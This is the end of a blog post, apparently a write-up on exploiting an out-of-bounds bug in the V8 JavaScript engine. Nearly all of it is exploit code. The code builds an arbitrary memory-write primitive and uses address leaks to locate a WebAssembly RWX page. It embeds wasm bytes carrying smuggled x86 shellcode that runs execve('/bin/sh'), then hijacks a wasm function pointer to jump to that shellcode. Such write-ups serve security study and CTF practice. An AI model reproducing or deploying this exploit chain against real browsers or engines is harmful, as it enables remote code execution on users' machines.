class_">Float64Array</span>(buffer_2);</span><br><span class="line"><span class="keyword">let</span> u32_2 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buffer_2);</span><br><span class="line"><span class="keyword">let</span> b64_2 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buffer_2);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">wasm_write</span>(<span class="params">addr, value</span>) &#123;</span><br><span class="line">    holder_addr_64 = changer[<span class="number">0</span>];</span><br><span class="line">    u32_2[<span class="number">0</span>] = <span class="title class_">Number</span>(addr)-<span class="number">8</span>;</span><br><span class="line">    u32_2[<span class="number">1</span>] = <span class="number">0xc</span>;</span><br><span class="line">    changer[<span class="number">0</span>] = f64_2[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    b64_2[<span class="number">0</span>] = value;</span><br><span class="line">    leaker[<span class="number">0</span>] = f64_2[<span class="number">0</span>];</span><br><span class="line">    changer[<span class="number">0</span>] = holder_addr_64;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// var data_buf = new ArrayBuffer(0x10);</span></span><br><span class="line"><span class="comment">// var data_view = new DataView(data_buf);</span></span><br><span class="line"><span class="comment">// data_view.setFloat64(0, 2.0, true);</span></span><br><span class="line"><span class="comment">// %DebugPrint(data_buf);</span></span><br><span class="line"><span class="comment">// %DebugPrint(data_view);</span></span><br><span class="line"><span class="comment">// while (1) &#123;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="keyword">let</span> shell_wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([</span><br><span class="line">    <span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">17</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">133</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">130</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">106</span>, <span class="number">59</span>, <span class="number">88</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">104</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">104</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">89</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">193</span>, <span class="number">227</span>, <span class="number">32</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">203</span>, <span class="number">83</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">210</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shell_wasm_module = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(shell_wasm_code);</span><br><span class="line"><span class="keyword">let</span> shell_wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(shell_wasm_module);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shell_func = shell_wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">shell_func</span>();</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(shell_func);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shell_wasm_instance_addr = <span class="title function_">addrof</span>(shell_wasm_instance);</span><br><span class="line"><span class="keyword">let</span> shell_wasm_rwx_addr = <span class="title function_">v8h_read64</span>(shell_wasm_instance_addr + <span class="number">0x48n</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shell_func_code_addr = shell_wasm_rwx_addr + <span class="number">0xB40n</span>;</span><br><span class="line"><span class="keyword">let</span> shell_code_addr = shell_func_code_addr + <span class="number">0x2Dn</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(shell_func_code_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(shell_code_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">%<span class="title class_">DebugPrint</span>(shell_wasm_instance);</span><br><span class="line"><span class="comment">// while (1) &#123;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([</span><br><span class="line"><span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">1</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">96</span>,<span class="number">1</span>,<span class="number">124</span>,<span class="number">1</span>,<span class="number">124</span>,<span class="number">96</span>,<span class="number">2</span>,<span class="number">124</span>,<span class="number">124</span>,<span class="number">0</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">125</span>,</span><br><span class="line"><span class="number">2</span>,<span class="number">36</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">105</span>,<span class="number">109</span>,<span class="number">112</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">115</span>,<span class="number">13</span>,<span class="number">105</span>,<span class="number">109</span>,<span class="number">112</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">100</span>,<span class="number">95</span>,<span class="number">102</span>,<span class="number">117</span>,</span><br><span class="line"><span class="number">110</span>,<span class="number">99</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">2</span>,<span class="number">106</span>,<span class="number">115</span>,<span class="number">3</span>,<span class="number">116</span>,<span class="number">98</span>,<span class="number">108</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">2</span>,</span><br><span class="line"><span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">7</span>,<span class="number">21</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">107</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">114</span>,<span class="number">97</span>,<span class="number">121</span>,<span class="number">0</span>,<span class="number">2</span>,</span><br><span class="line"><span class="number">10</span>,<span class="number">31</span>,<span class="number">2</span>,<span class="number">22</span>,<span class="number">0</span>,<span class="number">68</span>,<span class="number">144</span>,<span class="number">144</span>,<span class="number">144</span>,<span class="number">144</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">16</span>,<span class="number">195</span>,<span class="number">68</span>,<span class="number">204</span>,<span class="number">204</span>,<span class="number">204</span>,<span class="number">204</span>,<span class="number">204</span>,<span class="number">204</span>,</span><br><span class="line"><span class="number">233</span>,<span class="number">67</span>,<span class="number">26</span>,<span class="number">26</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">32</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">0</span>,<span class="number">11</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> tbl = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Table</span>(&#123;</span><br><span class="line">    <span class="attr">initial</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">element</span>: <span class="string">&quot;anyfunc&quot;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> importObject = &#123;</span><br><span class="line">    <span class="attr">imports</span>: &#123; imported_func : <span class="function">(<span class="params">n</span>) =&gt;</span> n + <span class="number">1</span>, &#125;,</span><br><span class="line">    <span class="attr">js</span>: &#123; tbl &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">let</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, importObject);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasmInstance_addr = <span class="title function_">addrof</span>(wasmInstance);</span><br><span class="line"><span class="keyword">let</span> RWX_page_pointer = <span class="title function_">v8h_read64</span>(wasmInstance_addr+<span class="number">0x48n</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> func_make_array = wasmInstance.<span class="property">exports</span>.<span class="property">make_array</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> func_main = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="title function_">wasm_write</span>(wasmInstance_addr+<span class="number">0x48n</span>, shell_code_addr);</span><br><span class="line"><span class="title function_">func_main</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>


    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/v8/" rel="tag"># v8</a>
              <a href="/tags/oob/" rel="tag"># oob</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/01/16/V8-turboFan/" rel="prev" title="V8-turboFan">
                  <i class="fa fa-angle-left"></i> V8-turboFan
                </a>
            </div>
            <div class="post-nav-item">
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">蓝桉</span>
  </div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
